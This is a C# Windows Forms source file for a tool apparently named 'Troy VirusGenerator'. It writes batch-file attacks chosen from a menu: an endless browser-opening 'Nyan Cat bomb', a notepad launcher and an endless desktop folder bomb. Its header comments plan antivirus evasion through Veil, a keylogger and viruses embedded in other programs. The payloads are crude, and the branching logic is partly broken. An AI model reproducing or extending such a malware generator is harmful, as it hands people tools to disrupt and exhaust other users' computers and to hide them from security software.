/*

Project: Virus Generator

Goals/TODO: 
1. Make a gui program that will take some user input and output a virus.
2. Viruses can be ran through Veil to further obfustecate the signature
3. Can Generate .exe, .bat files (soon will support many formats) - .bat files supported.


TODO:
1. Support '.exe' files. Learn how to compile 
2. Support '.py' viruses
3. Support '.ps1' viruses
4. Keylogger virus
5. Embed viruses in other programs.
 
Logic:
1. take some user input about what kind of virus they want to generate
2. Write out those specifications to a file.
*/




using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace VirusGenerator
{
    public partial class Troy : Form
    {
        
        string _outputFolder;
        string file_name;
        string fileExt;
        public Troy()
        {
            InitializeComponent();
            MessageBox.Show("Warning: This program generates actual viruses that CAN and WILL damage your computer if you don't know what you are doing. Use at your own risk.", "WARNING!!!");
        }

        private void BtnGen_Click(object sender, EventArgs e)
        {
            _outputFolder = @TxtBoxDes.Text; 
            file_name     = TxtBoxFileName.Text;
            fileExt       = CBoxFor.Text;

           if (CBoxAttack.Text == "Nyan Cat Bomb Attack") 
            {
                if (fileExt == ".bat")
                {
                    string[] nyanCatCmd = { "@echo off", ":loop", "start http://www.nyancat.com", "goto loop" };
                    System.IO.File.WriteAllLines(_outputFolder + file_name + fileExt, nyanCatCmd);
                }
                else
                {
                    MessageBox.Show("Unfortunately this attack only works in a '.bat' format. Select that and re-generate.");
                }
            }
           if (CBoxAttack.Text == "Infinite Loop Attack" && fileExt == ".bat")
           {
               string[] infiniteLoopCmd = { "@echo off",":loop", "start notepad.exe"};
                System.IO.File.WriteAllLines(_outputFolder + file_name + fileExt, infiniteLoopCmd);
           }
            if (CBoxAttack.Text == "Folder Bomb Attack")
            {
                
                string[] folderBombAttackCmd = { "@echo off",  "cd desktop", ":loop", "mkdir virus", "goto loop" };
                System.IO.File.WriteAllLines(_outputFolder + file_name + fileExt, folderBombAttackCmd);
            }
           else
            {
                MessageBox.Show("That's not a valid command.");
            }
            


        }

        public void CBoxFor_SelectedIndexChanged(object sender, EventArgs e)
        {
            string formatSelected = CBoxFor.Text;
            if (formatSelected == ".exe")
            {
                fileExt = ".exe";
            }
            else
            {
                fileExt = ".bat";
            }

            ToolStrip.Text = $"Format Selected: '{formatSelected}'"; //Updates tool stip with format
        }

        private void versionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Troy \nVirusGenerator v1.0 \n2015"); //About message
        }

        private void BtnExit_Click(object sender, EventArgs e)
        {
            Close(); //closes program when clicked.
        }

        private void TxtBoxFileName_TextChanged(object sender, EventArgs e)
        {
            ToolStrip.Text = $"Name Chosen: '{TxtBoxFileName.Text}'"; //shows updated name in the tool stip

        }

        private void CBoxAttack_SelectedIndexChanged(object sender, EventArgs e)
        {
            string attackSelected = CBoxAttack.Text;

            //More code will go here.

            ToolStrip.Text = $"Attack Selected: '{attackSelected}'";
        }

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Close(); //closes program from the menu stip.
        }
    }
}
